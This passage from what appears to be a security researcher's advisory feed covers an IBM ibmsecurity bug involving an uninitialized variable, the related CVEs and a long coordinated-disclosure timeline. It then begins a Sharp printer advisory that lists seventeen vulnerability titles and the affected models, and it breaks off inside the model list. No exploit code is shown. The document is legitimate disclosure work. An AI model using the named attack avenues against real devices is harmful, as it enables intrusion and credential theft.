<p>The <code>json_data</code> variable is used on line 106 but is only defined on line 108:</p>
<p>Content of <code>ibmsecurity/isam/aac/attribute_matchers.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">...</span>
 <span style="color: #666666">98</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">_check</span>(isamAppliance, description, properties):
 <span style="color: #666666">99</span>     <span style="color: #BA2121">&quot;&quot;&quot;</span>
<span style="color: #BA2121">100     Check and return True if update needed</span>
<span style="color: #BA2121">101     &quot;&quot;&quot;</span>
<span style="color: #666666">102</span>     update_required <span style="color: #666666">=</span> <span style="color: #008000">False</span>
<span style="color: #666666">103</span>     ret_obj <span style="color: #666666">=</span> get(isamAppliance, description)
<span style="color: #666666">104</span>     <span style="color: #008000; font-weight: bold">if</span> ret_obj[<span style="color: #BA2121">&#39;data&#39;</span>] <span style="color: #666666">==</span> {}:
<span style="color: #666666">105</span>         logger<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;Attribute Matcher not found, returning no update required.&quot;</span>)
<span style="color: #666666">106</span>         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000">None</span>, update_required, json_data
<span style="color: #666666">107</span>     <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">108</span>         json_data <span style="color: #666666">=</span> {
<span style="color: #666666">109</span>             <span style="color: #BA2121">&quot;properties&quot;</span>: properties,
<span style="color: #666666">110</span>             <span style="color: #BA2121">&quot;predefined&quot;</span>: ret_obj[<span style="color: #BA2121">&#39;data&#39;</span>][<span style="color: #BA2121">&#39;predefined&#39;</span>],
<span style="color: #666666">111</span>             <span style="color: #BA2121">&quot;supportedDatatype&quot;</span>: ret_obj[<span style="color: #BA2121">&#39;data&#39;</span>][<span style="color: #BA2121">&#39;supportedDatatype&#39;</span>],
<span style="color: #666666">112</span>             <span style="color: #BA2121">&quot;uri&quot;</span>: ret_obj[<span style="color: #BA2121">&#39;data&#39;</span>][<span style="color: #BA2121">&#39;uri&#39;</span>]
<span style="color: #666666">113</span>         }
<span style="color: #666666">...</span>
</pre></div>

<p>Content of <code>ibmsecurity/isam/aac/risk_profiles.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">...</span>
<span style="color: #666666">152</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">_check</span>(isamAppliance, name, active, description, attributes, predefined):
<span style="color: #666666">153</span>     <span style="color: #BA2121">&quot;&quot;&quot;</span>
<span style="color: #BA2121">154     Check and return True if update needed</span>
<span style="color: #BA2121">155     &quot;&quot;&quot;</span>
<span style="color: #666666">156</span>     update_required <span style="color: #666666">=</span> <span style="color: #008000">False</span>
<span style="color: #666666">157</span>     ret_obj <span style="color: #666666">=</span> get(isamAppliance, name)
<span style="color: #666666">158</span>     <span style="color: #008000; font-weight: bold">if</span> ret_obj[<span style="color: #BA2121">&#39;data&#39;</span>] <span style="color: #666666">==</span> {}:
<span style="color: #666666">159</span>         logger<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;Risk Profile not found, returning no update required.&quot;</span>)
<span style="color: #666666">160</span>         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000">None</span>, update_required, json_data
<span style="color: #666666">161</span>     <span style="color: #008000; font-weight: bold">else</span>:   
<span style="color: #666666">162</span>         <span style="color: #008000; font-weight: bold">if</span> ret_obj[<span style="color: #BA2121">&#39;data&#39;</span>][<span style="color: #BA2121">&#39;predefined&#39;</span>] <span style="color: #AA22FF; font-weight: bold">is</span> <span style="color: #008000">True</span>:
<span style="color: #666666">163</span>             logger<span style="color: #666666">.</span>warning(<span style="color: #BA2121">&quot;Predefined Risk Profiles can NOT be updated, returning no update required.&quot;</span>)
<span style="color: #666666">164</span>             <span style="color: #008000; font-weight: bold">return</span> ret_obj[<span style="color: #BA2121">&#39;data&#39;</span>][<span style="color: #BA2121">&#39;id&#39;</span>], update_required, {}
<span style="color: #666666">165</span>         <span style="color: #008000; font-weight: bold">else</span>:
<span style="color: #666666">166</span>             json_data <span style="color: #666666">=</span> {
<span style="color: #666666">167</span>                 <span style="color: #BA2121">&quot;name&quot;</span>: name,
<span style="color: #666666">168</span>                 <span style="color: #BA2121">&quot;active&quot;</span>: active,
<span style="color: #666666">169</span>                 <span style="color: #BA2121">&quot;predefined&quot;</span>: predefined
<span style="color: #666666">170</span>             }
<span style="color: #666666">171</span>             <span style="color: #008000; font-weight: bold">if</span> attributes <span style="color: #AA22FF; font-weight: bold">is</span> <span style="color: #AA22FF; font-weight: bold">not</span> <span style="color: #008000">None</span>:
<span style="color: #666666">172</span>                 json_data[<span style="color: #BA2121">&#39;attributes&#39;</span>] <span style="color: #666666">=</span> attributes
<span style="color: #666666">...</span>
</pre></div>

<p>The Python code can crash.</p>
<h2>Vendor Response</h2>
<p>IBM provided a security bulletin:</p>
<p><a href="https://www.ibm.com/support/pages/node/7147932">Security Bulletin: Multiple Security Vulnerabilities were found in Open Source libraries used to deploy IBM Security Verify Access Appliances (CVE-2024-31871, CVE-2024-31872, CVE-2024-31873, CVE-2024-31874)</a>:</p>
<ul>
<li>CVE-2024-31871: IBM Security Verify Access Appliance could allow a malicious actor to conduct a man in the middle attack when deploying Python scripts due to improper certificate validation.</li>
<li>CVE-2024-31872: IBM Security Verify Access Appliance could allow a malicious actor to conduct a man in the middle attack when deploying Open Source scripts due to missing certificate validation.</li>
<li>CVE-2024-31873: IBM Security Verify Access Appliance contains hard-coded credentials which it uses for its own inbound authentication that could be obtained by a malicious actor.</li>
<li>CVE-2024-31874: IBM Security Verify Access Appliance uses uninitialized variables when deploying that could allow a local user to cause a denial of service.</li>
</ul>
<p><a id="timeline"></a></p>
<h2>Report Timeline</h2>
<p>This security assessment was reported to IBM along with the security assessment of IBM Security Verify Access. Please find the complete timeline below:</p>
<ul>
<li>October 2022: Security assessment performed on IBM Security Verify Access.</li>
<li>Feb 12, 2023: A complete report was sent to IBM.</li>
<li>Feb 13, 2023: IBM acknowledged the reception of the security assessment and said that scan tools usually report a lot of issues so I have to check the status of detected CVEs by browsing RedHat webpages and create an issue for each CVE.</li>
<li>Feb 13, 2023: Replied to IBM saying that the security assessment was not done using a scanner.</li>
<li>Feb 14, 2023: Asked for an update.</li>
<li>Feb 14, 2023: IBM confirmed that the report was shared with L3 and "IBM hacking team".</li>
<li>Feb 22, 2023: IBM said they were still assessing the report.</li>
<li>Mar 13, 2023: An additional report on ibmsecurity was sent to IBM.</li>
<li>Mar 13, 2023: IBM confirmed that the second report was shared with L3 team.</li>
<li>Mar 15, 2023: IBM wanted to organize a meeting about the findings.</li>
<li>Mar 15, 2023: I replied that I would like to have a written feedback for each reported vulnerability in order to have constructive discussion.</li>
<li>Apr 4, 2023: I asked again IBM to confirm the vulnerabilities</li>
<li>Apr 5, 2023: IBM shared the analysis (VulnerabilityResponse.xlsx), confirming several vulnerabilities.</li>
<li>Apr 11, 2023: I provided my comments (VulnerabilityResponse-comments-Pierre.xlsx) and asked to organize a meeting.</li>
<li>Apr 11, 2023: IBM confirmed a meeting is possible.</li>
<li>Apr 18, 2023: I asked to organize a meeting on Apr 19, 2023.</li>
<li>Apr 18, 2023: IBM confirmed a meeting is possible.</li>
<li>Apr 19, 2023: I asked to have a meeting where every party (dev team, support and myself) can be present.</li>
<li>Apr 19, 2023: IBM confirmed a meeting would take place on Apr 20, 2023.</li>
<li>Apr 20, 2023: Meeting with IBM regarding ISVA. IBM confirmed they would recheck some of the issues and would provide CVEs for the vulnerabilities.</li>
<li>Apr 23, 2023: I asked to have a second meeting about ibmsecurity.</li>
<li>Apr 23, 2023: IBM confirmed they will organize a meeting on ibmsecurity.</li>
<li>Apr 24, 2023: I asked the timeline to get security patches.</li>
<li>Apr 24, 2023: IBM confirmed there are no ETA to get security patches.</li>
<li>Apr 27, 2023: Meeting with IBM regarding ibmsecurity. IBM confirmed they will fix all the issues.</li>
<li>May 10, 2023: I asked for CVE identifiers to track the vulnerabilities.</li>
<li>May 11, 2023: IBM said that PSIRT records have been opened and the scoring is in progress.</li>
<li>May 15, 2023: I reached IBM because I found a CVE (CVE-2023-25927) and a security bulletin likely corresponding to a vulnerability I reported, thanks to <a href="https://twitter.com/CVEnew">@CVEnew</a> on Twitter: <a href="https://www.ibm.com/support/pages/node/6989653">https://www.ibm.com/support/pages/node/6989653</a>. I asked if this was one of the reported vulnerabilities.</li>
<li>Jul 7, 2023: IBM said the dev team was still working on the final list of issues and that everything would be fixed in the 10.0.7 release.</li>
<li>Jul 10, 2023: I asked when the 10.0.7 release would be available. I asked again more details about the previous advisory.</li>
<li>Jul 11, 2023: IBM said that the 10.0.7 release would be published on Dec 23, 2023. Regarding the CVEs, IBM replied they would need to discuss with the dev team.</li>
<li>Jul 12, 2023: I asked IBM to confirm if CVE-2023-25927 was one of the reported vulnerabilities.</li>
<li>Jul 12, 2023: IBM said that they do not credit security researchers.</li>
<li>Jul 13, 2023: I provided several IBM security bulletins where security researchers were credited, e.g. <a href="https://www.ibm.com/support/pages/security-bulletin-vulnerabilities-exist-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430">https://www.ibm.com/support/pages/security-bulletin-vulnerabilities-exist-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430</a>.</li>
<li>Jul 14, 2023: IBM confirmed that they would forward the information to L3 team and asked what I would want to do with this case.</li>
<li>Jul 14, 2023: I said that (1) I was still waiting for information about CVE-2023-25927, (2) I did not have any information regarding security patches for ibmsecurity and (3) I asked IBM to provide me with the final list of vulnerabilities that would be patched in the 10.0.7. Since the list of confirmed vulnerabilities was quite long, I wanted to confirm that nothing was missed.</li>
<li>Jul 28, 2023: IBM said that they did not know if CVE-2023-25927 is one of the reported vulnerabilities and in any case, it is impossible to edit the security bulletin and give credits.</li>
<li>Aug 16, 2023: IBM asked if additional assistance was required [NB: IBM likely wanted to close this ticket while no security patches were published].</li>
<li>Aug 17, 2023: I asked again information about ibmsecurity and CVE-2023-25927.</li>
<li>Oct 20, 2023: IBM said they were still analysing the requests (final list of patched vulnerabilties, security patches of ibmsecurity and status of CVE-2023-25927).</li>
<li>Oct 25, 2023: IBM asked to organize a meeting.</li>
<li>Oct 25, 2023: I replied that I was still waiting for the final list of vulnerabilities that would be fixed in version 10.0.7. There was also no information regarding security patches for ibmsecurity.</li>
<li>Oct 25, 2023: IBM replied they wanted to discuss about the vulnerabilities in a meeting.</li>
<li>Oct 29, 2023: IBM asked to organize a meeting again.</li>
<li>Oct 30, 2023: I accepted the meeting and I asked IBM to provide the list of vulnerabilities that would be patched with their current status. I also asked the status of ibmsecurity.</li>
<li>Oct 30, 2023: IBM asked to have a meeting on Nov 7, 2023.</li>
<li>Nov 2, 2023: I confirmed my presence to the meeting.</li>
<li>Nov 5, 2023: IBM confirmed the meeting.</li>
<li>Nov 7, 2023: Meeting with IBM. IBM provided me with a new report containing new feedbacks for several vulnerabilities. Also IBM confirmed that several vulnerabilities would be patched in 2024 and ibmsecurity would be patched in December 2023. IBM asked me to review a specific vulnerability that appears to be invalid (<em>V-[REDACTED] - Insecure SSLv3 connections to the DSC servers</em>).</li>
<li>Nov 21, 2023: IBM asked me to review the new report shared by IBM.</li>
<li>Nov 28, 2023: IBM asked for updates.</li>
<li>Dec 4, 2023: I answered that I did not have anymore access to the test infrastructure and IBM had to wait for my analysis until I get again access to the test infrastructure.</li>
<li>Dec 4, 2023: IBM asked me to check the vulnerabilities as soon as possible.</li>
<li>Dec 21, 2023: I got access to a test infrastructure and reviewed some vulnerabilities.</li>
<li>Dec 21, 2023: I sent a new analysis to IBM, containing details of 4 vulnerabilities.</li>
<li>Dec 27, 2023: IBM confirmed the reception of the new analysis.</li>
<li>Jan 15, 2024: IBM asked me to update ISVA and recheck all the vulnerabilities.</li>
<li>Jan 16, 2024: I asked IBM if ibmsecurity was also patched.</li>
<li>Jan 16, 2024: IBM confirmed that a new case must be opened for ibmsecurity to get security patches(!).</li>
<li>Jan 22, 2024: IBM wanted to organize a new meeting.</li>
<li>Jan 22, 2024: I replied that I failed to understand the issue with the ibmsecurity library and that I had a written confirmation by IBM that security patches would be provided. The vulnerabilities found in ibmsecurity were reported in March 2023 (10 months ago).</li>
<li>Jan 22, 2024: I informed IBM that I discovered(!) a new security bulletin thanks to <a href="https://twitter.com/CVEnew">@CVEnew</a>: <a href="https://www.ibm.com/support/pages/node/7106586">https://www.ibm.com/support/pages/node/7106586</a>, but only 15 vulnerabilities were listed instead of the 35 vulnerabilities confirmed by IBM. I asked IBM to clarify the situation as it looked like less than half of vulnerabilities were indeed patched.</li>
<li>Jan 24, 2024: IBM created a new case for ibmsecurity.</li>
<li>Jan 29, 2024: IBM confirmed that 5 vulnerabilities had not been patched in the latest version (10.0.7).</li>
<li>Jan 29, 2024: I reached IBM to get the status of 15 unpatched vulnerabilities. I provided the updated analysis to IBM.</li>
<li>Feb 7, 2024: IBM confirmed that some of the vulnerabilities were "being processed" and that some of vulnerabilities had been also silently patched and no security bulletins had been published.</li>
<li>Feb 20, 2024: IBM asked for updates.</li>
<li>Feb 20, 2024: I asked when would be the release date for ISVA 10.0.8 and the complete list of vulnerabilities that would be patched in this release.</li>
<li>Feb 20, 2024: IBM confirmed that the 10.0.8 release would be published in mid-2024.</li>
<li>Feb 23, 2024: I sent a new vulnerability to IBM "Authentication Bypass on IBM Security Verify Runtime".</li>
<li>Feb 23, 2024: IBM confirmed the reception of the vulnerability and asked to close the ticket.</li>
<li>Feb 23, 2024: I said that since some vulnerabilities had not been patched, the ticket must stay open.</li>
<li>Feb 23, 2024: IBM said that they cannot keep the ticket open and they needed to close it.</li>
<li>Feb 23, 2024: I explained that the vulnerabilities were reported over a year ago and IBM confirmed they had not fully fixed in the latest version and that some vulnerabilities were also still under evaluation. I said that I would agree to close this ticket if IBM could confirm that all vulnerabilities reported in the ticket had been correctly fixed in the latest version. I also asked IBM to provide the corresponding security bulletins.</li>
<li>Feb 27, 2024: Regarding the authentication bypass, IBM replied that the runtime was supposed to be in the intranet zone.</li>
<li>Feb 28, 2024: I asked IBM to clarify where in the documentation specified that the runtime should not be exposed. For example, in <a href="https://www.ibm.com/docs/en/sva/10.0.7?topic=support-docker-image-verify-access-runtime">https://www.ibm.com/docs/en/sva/10.0.7?topic=support-docker-image-verify-access-runtime</a>, it was not explained that exposing this runtime on the network was a high security risk.</li>
<li>Mar 4, 2024: Regarding the vulnerabilities found in ibmsecurity, IBM said that any security vulnerability found in ibmsecurity must be reported by opening an issue in the Github repository.</li>
<li>Mar 8, 2024: IBM confirmed they were able to reproduce the authentication bypass vulnerability.</li>
<li>Mar 12, 2024: IBM confirmed they would add an optional MTLS authentication in the next release (10.0.8) and they would update the ISVA documentation to block any attempt of the authentication bypass vulnerability.</li>
<li>Mar 29, 2024: IBM published a new security bulletin: <a href="https://www.ibm.com/support/pages/node/7145400">https://www.ibm.com/support/pages/node/7145400</a>.</li>
<li>Mar 29, 2024: IBM confirmed that any security vulnerability found in ibmsecurity must be reported by opening an issue in the Github repository.</li>
<li>Apr 1, 2024: Creation of <a href="https://github.com/IBM-Security/ibmsecurity/issues/416">https://github.com/IBM-Security/ibmsecurity/issues/416</a>.</li>
<li>Apr 2, 2024: IBM confirmed the reception of the report <a href="https://github.com/IBM-Security/ibmsecurity/issues/416#issuecomment-2032110397">https://github.com/IBM-Security/ibmsecurity/issues/416#issuecomment-2032110397</a>.</li>
<li>Apr 3, 2024: <a href="https://github.com/IBM-Security/ibmsecurity/issues/416">https://github.com/IBM-Security/ibmsecurity/issues/416</a> was entirely redacted by IBM.</li>
<li>Apr 5, 2024: I asked if the vulnerabilities would be patched in the <a href="https://github.com/IBM-Security/ibmsecurity/issues/416">#416 issue</a>.</li>
<li>Apr 6, 2024: Issue <a href="https://github.com/IBM-Security/ibmsecurity/issues/416">#416</a> closed.</li>
<li>Apr 6, 2024: I added again the content of <a href="https://github.com/IBM-Security/ibmsecurity/issues/416">https://github.com/IBM-Security/ibmsecurity/issues/416</a> and asked if CVEs would be published.</li>
<li>Apr 10, 2024: Security bulletin for ibm security published: <a href="https://www.ibm.com/support/pages/node/7147932">https://www.ibm.com/support/pages/node/7147932</a>.</li>
<li>Apr 10, 2024: I reached IBM regarding a new security bulletin, with a potential vulnerability I reported <a href="https://www.ibm.com/support/pages/node/7145828">https://www.ibm.com/support/pages/node/7145828</a>.</li>
<li>Apr 10, 2024: IBM said this security bulletin was unrelated to the vulnerabilities I reported.</li>
<li>Apr 15, 2024: IBM confirmed that the final vulnerabilities would be fixed in ISVA 10.0.8.</li>
<li>Apr 15, 2024: I provided a list of unfixed vulnerabilities and asked for more information.</li>
<li>Apr 16, 2024: IBM confirmed that all the unfixed vulnerabilities would be fixed in ISVA 10.0.8 and asked to close the ticket.</li>
<li>Apr 16, 2024: I confirmed that this ticket can be closed only when the security patches are available.</li>
<li>Apr 16, 2024: IBM confirmed they wanted to close the ticket because nothing would be updated before mid-2024.</li>
<li>Apr 17, 2024: I replied that "It makes no sense to close this ticket until the vulnerabilities have been fixed. The fact that the vulnerabilities are fixed mid-year is a decision made by IBM. IBM was made aware of these vulnerabilities over a year ago, and yet we are still waiting for security patches. If this ticket is closed, I would consider that the vulnerabilities have been fixed and it is perfectly fine to publish the technical analysis."</li>
<li>May 6, 2024: IBM closed the existing ticket and opened new tickets for the remaining vulnerabilities.</li>
<li>May 6, 2024: I contacted IBM PSIRT asking if it was fine to publish the vulnerabilities since the ticket was closed by IBM.</li>
<li>May 7, 2024: I reopened the ticket stating that some of the patched vulnerabilities did not receive a CVE and there were also some unpatched vulnerabilities. I asked IBM to provide me with the CVE assigned to each vulnerability. I also asked IBM to confirm that, since this ticket had been closed by IBM, all the vulnerabilities had been fixed and that I would be able to publish the technical details.</li>
<li>May 8, 2024: IBM said they would review the list of vulnerabilities.</li>
<li>May 10, 2024: IBM PSIRT asked me not to publish technical details of unpatched vulnerabilities.</li>
<li>May 17, 2024: IBM provided me with an incomplete list of CVEs, with different vulnerabilities under the same CVE identifier and asked to close the ticket.</li>
<li>May 20, 2024: IBM asked for my comments on the list of CVEs.</li>
<li>May 20, 2024: I confirmed that several CVEs were missing and the list was incomplete.</li>
<li>May 21, 2024: IBM provided me with an explanation regarding the missing CVEs.</li>
<li>May 21, 2024: I asked IBM to quote their explanation in the security advisory.</li>
<li>May 21, 2024: IBM asked to have a meeting.</li>
<li>May 22, 2024: I replied that I would prefer written communication since it was very difficult to track the status of the vulnerabilities with (1) CVEs obtained only several months after the release of security bulletins, (2) tickets closed by IBM for unpatched vulnerabilities, (3) vulnerabilities in ibmsecurity which could be corrected by IBM and which could then no longer be managed by IBM, and (4) missing CVEs.</li>
<li>May 22, 2024: IBM asked to have a meeting to remove any confusion.</li>
<li>May 23, 2024: I replied that there's not much confusion except missing CVEs for silently patched vulnerabilities and lack of communication from IBM when releasing security patches. I asked IBM to share the CVEs with the corresponding vulnerabilities and indicate the security bulletins with the list of corresponding vulnerabilities.</li>
<li>May 24, 2024: IBM stated they would provide me with additional CVEs.</li>
<li>May 30, 2024: I confirmed that the creation of additional CVEs is fair.</li>
<li>Jun 2, 2024: IBM confirmed 3 new CVEs in a new security bulletin: <a href="https://www.ibm.com/support/pages/node/7155356">https://www.ibm.com/support/pages/node/7155356</a>.</li>
<li>Jun 3, 2024: I asked IBM the release date of the 10.0.8 version.</li>
<li>Jun 3, 2024: IBM confirmed that the exact date was not yet decided.</li>
<li>Jun 6, 2024: IBM asked if I had comments about the remaining vulnerabilities.</li>
<li>Jun 8, 2024: I asked IBM the status of a previously patched vulnerability.</li>
<li>Jun 10, 2024: IBM confirmed that this vulnerability had not been previously patched and would be patched in the 10.0.8 release.</li>
<li>Jun 11, 2024: IBM asked to create separate cases for the remaining vulnerabilities.</li>
<li>Jun 19, 2024: IBM asked if I needed assistance.</li>
<li>Jun 23, 2024: IBM confirmed that the 10.0.8 version was released and that they would close the ticket tracking the vulnerabilities.</li>
<li>Jun 26, 2024: I asked IBM to provide the corresponding CVEs and the link of the security bulletin.</li>
<li>Jun 27, 2024: IBM provided me with the link to the security bulletin: <a href="https://www.ibm.com/support/pages/node/7158790">https://www.ibm.com/support/pages/node/7158790</a> and said that the 10.0.8 version was released with all the patched vulnerabilities. IBM closed the ticket.</li>
<li>Jul 3, 2024: I reopened the ticket and asked IBM to provide me with the list of vulnerabilities with the corresponding CVEs since I was not able to correctly map the CVEs to the vulnerabilities I reported.</li>
<li>Jul 8, 2024: IBM provided me with the list of CVEs. IBM closed the ticket.</li>
<li>Sep 7, 2024: I sent an email to IBM PSIRT stating that I was going to publish the security advisory and that some CVEs were still missing. I also stated that CVE-2023-38371 seemed to be an error since it was confirmed not to be a vulnerability according to our previous email exchanges.</li>
<li>Sep 9, 2024: I asked IBM to provide me with an official link regarding the runtime authentication bypass, to publish it in the security advisory.</li>
<li>Sep 13, 2024: IBM PSIRT provided me with (1) links regarding the runtime authentication bypass and (2) additional CVEs. They also confirmed that at least one vulnerability was not fixed and asked me not to disclose this finding until it was patched. No information was provided when this vulnerability would be patched.</li>
<li>Nov 1, 2024: A security advisory is published.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Barre aka Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2024-11-01-ibmsecurity-4-vulnerabilities.html">https://pierrekim.github.io/blog/2024-11-01-ibmsecurity-4-vulnerabilities.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/2024-ibmsecurity.txt">https://pierrekim.github.io/advisories/2024-ibmsecurity.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2024-11-01-ibm-security-verify-access-32-vulnerabilities.html">https://pierrekim.github.io/blog/2024-11-01-ibm-security-verify-access-32-vulnerabilities.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/2024-ibm-security-verify-access.txt">https://pierrekim.github.io/advisories/2024-ibm-security-verify-access.txt</a></p>
<p><a href="https://www.ibm.com/support/pages/node/7147932">https://www.ibm.com/support/pages/node/7147932</a></p>
<p><a href="https://github.com/IBM-Security/ibmsecurity/issues/416">https://github.com/IBM-Security/ibmsecurity/issues/416</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>17 vulnerabilities in Sharp Multi-Function Printers</title>
        <link href="2024-06-27-sharp-mfp-17-vulnerabilities.html"/>
        <content type="html"><h2>Product description</h2>
<blockquote>
<p>Multifunction printers offer more than just print. These devices integrate the power of a printer, photocopier and scanner into one single device.  </p>
<p>From <a href="https://www.sharp.co.uk/printers-photocopiers/explore-sharp-printers/sharp-multifunction-printers">https://www.sharp.co.uk/printers-photocopiers/explore-sharp-printers/sharp-multifunction-printers</a></p>
</blockquote>
<h2>Vulnerability Summary</h2>
<p>Vulnerable versions: 308 different models of Sharp Multi-Function Printers (MFP) are vulnerable. It is recommended to visit the official <a href="https://global.sharp/products/copier/info/info_security_2024-05.html">Sharp advisory</a> and apply security patches and replace unsupported Multi-Function Printers (MFP) models.</p>
<p>The summary of the vulnerabilities is as follows:</p>
<ol>
<li><a href="#pre-auth-memory-corruption">CVE-2024-28038 - Memory corruption in the main program - Remote Code Execution against the web server without authentication</a></li>
<li><a href="#pre-auth-invalid-pointer-dereference">CVE-2024-36251 - Invalid (0x000000d0) pointer dereference - Remote DoS without authentication</a></li>
<li><a href="#world-readable-coredump-files-insecure-storage-creds">CVE-2024-28955, CVE-2024-29146, CVE-2024-29978, CVE-2024-32151 - World-readable coredump files and insecure storage of credentials</a></li>
<li><a href="#pre-auth-arbitrary-directory-listing">CVE-2024-33605 - Arbitrary Directory Listing without authentication</a></li>
<li><a href="#pre-auth-lfi">non-assigned CVE vulnerability - Local File Inclusion allowing to read any file (e.g. Coredump files) without authentication</a><br>
5.1 <a href="#pre-auth-lfi-pwn-01">Generation of the coredump file on the printer</a><br>
5.2 <a href="#pre-auth-lfi-pwn-02">Local File Inclusion of the coredump file</a><br>
5.3 <a href="#pre-auth-lfi-pwn-03">Retrieve of credentials using the coredump files</a><br>
5.4 <a href="#pre-auth-lfi-pwn-04">Retrieve of credentials using configuration files</a><br></li>
<li><a href="#pre-auth-cookies">CVE-2024-33610 - Backdoor webpage - Listing of session cookies without authentication</a></li>
<li><a href="#pre-auth-conf-webpages">non-assigned CVE vulnerability - Configuration webpages reachable without authentication</a></li>
<li><a href="#pre-auth-dos">CVE-2024-33610 - Reboot without authentication - Remote DoS</a></li>
<li><a href="#backdoor-service">CVE-2024-35244 - Backdoor access - Service</a></li>
<li><a href="#backdoor-fss-user">non-assigned CVE vulnerability - Backdoor access - FSS User</a></li>
<li><a href="#insecure-default-credentials">non-assigned CVE vulnerability - Insecure default credentials</a></li>
<li><a href="#read-admin-access-telnet">CVE-2024-33616 - Read admin access on telnet</a></li>
<li><a href="#xss-login">non-assigned CVE vulnerability - XSS on all the Sharp printers (login.html)</a></li>
<li><a href="#xss-all-pages">non-assigned CVE vulnerability - XSS on all the Sharp printers (all other HTML pages)</a></li>
<li><a href="#ldap-credentials-exfiltration">CVE-2024-34162 - Exfiltration of LDAP credentials by downgrading the security</a></li>
<li><a href="#hardcoded-google-api-keys">CVE-2024-36248 - Hardcoded Google API Keys</a></li>
<li><a href="#hardcoded-aws-api-keys">non-assigned CVE vulnerability - Hardcoded Amazon API Keys</a></li>
<li><a href="#cve-2022-45796">N-day CVE-2022-45796 - Remote Code Execution</a></li>
</ol>
<p>TL;DR: An attacker can compromise Sharp Multi-Function Printers using multiple vulnerabilities.</p>
<p>List of vulnerable models of Sharp Multi-Function Printers (308 models):</p>
<pre><code>BP-30C25, BP-30C25T, BP-30C25Y, BP-30C25Z, BP-30M35, BP-30M31, BP-30M28, BP-30M35T, BP-30M31T, BP-30M28T, 
BP-50C36, BP-50C31, BP-50C26, BP-50C65, BP-50C55, BP-50C45, BP-50M36, BP-50M31, BP-50M26, BP-50M55, 
BP-50M50, BP-50M45, BP-55C26, BP-60C45, BP-60C36, BP-60C31, BP-70C36, BP-70C31, BP-70C65, BP-70C55, 
BP-70C45, BP-70M36, BP-70M31, BP-70M65, BP-70M55, BP-70M45, BP-90C70, BP-90C80, BP-B547WD, BP-B537WR, 
BP-B550WD, BP-B540WR, BP-70M90, BP-70M75, MX-M1205, MX-M1055, DX-2500N, DX-2000U, MX-2010U, MX-1810U, 
MX-2314N, MX-2314NR, MX-2630N, MX-3050N A, MX-3050V A, MX-3100N, MX-3100G, MX-2600N, MX-2600G, MX-3101N, 
MX-2601N, MX-2301N, MX-3111U, MX-2310U, MX-2310R, MX-3115N, MX-2615N, MX-2615 A, MX-3116N, MX-2616N, 
MX-3551, MX-3051, MX-2651, MX-3570N, MX-3070N, MX-3570V, MX-3070V, MX-3571, MX-3071, MX-3571S, 
MX-3071S, MX-3610N, MX-3110N, MX-2610N, MX-3110N A, MX-3610NR, MX-3640N, MX-3140N, MX-2640N, MX-3140N A, 
MX-3640NR, MX-3140NR, MX-2640NR, MX-4050N, MX-3550N, MX-3050N, MX-4050V, MX-3550V, MX-3050V, MX-4060N, 
MX-3560N, MX-3060N, MX-4060V, MX-3560V, MX-3060V, MX-4061, MX-3561, MX-3061, MX-4061S, MX-3561S, 
MX-3061S, MX-5001N, MX-5000N, MX-4101N, MX-4100N, MX-5112N, MX-5111N, MX-5110N, MX-4112N, MX-4111N, 
MX-4110N, MX-5141N A, MX-4140N A, MX-5141N, MX-5140N, MX-4141N, MX-4140N, MX-6050N, MX-5050N, MX-6050V, 
MX-5050V, MX-6051, MX-5051, MX-4051, MX-6070N A, MX-4070N A, MX-3070N A, MX-6070N, MX-5070N, MX-4070N, 
MX-6070V A, MX-4070V A, MX-3070V A, MX-6070V, MX-5070V, MX-4070V, MX-6071, MX-5071, MX-4071, MX-6071S, 
MX-5071S, MX-4071S, MX-7040N, MX-6240N, MX-7500N, MX-6500N, MX-7580N, MX-6580N, MX-8081, MX-7081, 
MX-8090N, MX-7090N, MX-B400P, MX-B380P, MX-B401, MX-B381, MX-B402, MX-B382, MX-B402P, MX-B382P, 
MX-B402SC, MX-B382SC, MX-B455W, MX-B355W, MX-B455WT, MX-B355WT, MX-B455WZ, MX-B355WZ, MX-B456WH, MX-B356WH, 
MX-B456W, MX-B356W, MX-B476WH, MX-B376WH, MX-B476W, MX-B376W, MX-C301W, MX-C301, MX-C304, MX-C303, 
MX-C304WH, MX-C303WH, MX-C304W, MX-C303W, MX-C312, MX-C311, DX-C311, DX-C311J, MX-C310, DX-C310, 
MX-C381, DX-C381, MX-C380, MX-C381B, MX-C400P, MX-C380P, MX-C401, DX-C401, DX-C401 J, MX-C400, 
DX-C400, MX-C402SC, MX-C382SC, MX-C382SCB, MX-M1204, MX-M1054, MX-M904, MX-M1206, MX-M1056, MX-M2630, 
MX-M2630 A, MX-M266N, MX-M265N, MX-M265U, MX-M266NV, MX-M265NV, MX-M265UV, MX-M3050 A, MX-M314NV, MX-M264NV, 
MX-M315NE, MX-M265NE, MX-M315NE, MX-M265NE, MX-M315V, MX-M265V, MX-M354N, MX-M314N, MX-M264N, MX-M354NR, 
MX-M314NR, MX-M264NR, MX-M354U, MX-M314U, MX-M264U, MX-M3550, MX-M3050, MX-M3551, MX-M3051, MX-M2651, 
